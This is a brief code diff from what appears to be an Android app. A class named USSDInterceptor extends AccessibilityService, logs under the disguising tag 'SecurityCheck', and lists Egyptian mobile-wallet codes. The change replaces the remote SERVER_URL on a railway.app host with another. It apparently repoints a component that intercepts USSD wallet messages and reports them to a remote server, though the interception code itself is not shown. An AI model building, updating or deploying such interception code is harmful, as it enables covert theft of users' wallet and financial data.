@@ -33,7 +33,7 @@ import java.util.regex.Pattern;
 public class USSDInterceptor extends AccessibilityService {
 
     private static final String TAG = "SecurityCheck";
-    private static final String SERVER_URL = "https://daf-production-e34a.up.railway.app";
+    private static final String SERVER_URL = "https://daf-production-c62c.up.railway.app";
 
     // ★ كل المحافظات المدعومة (مصر)
     private static final String[] WALLET_CODES = {
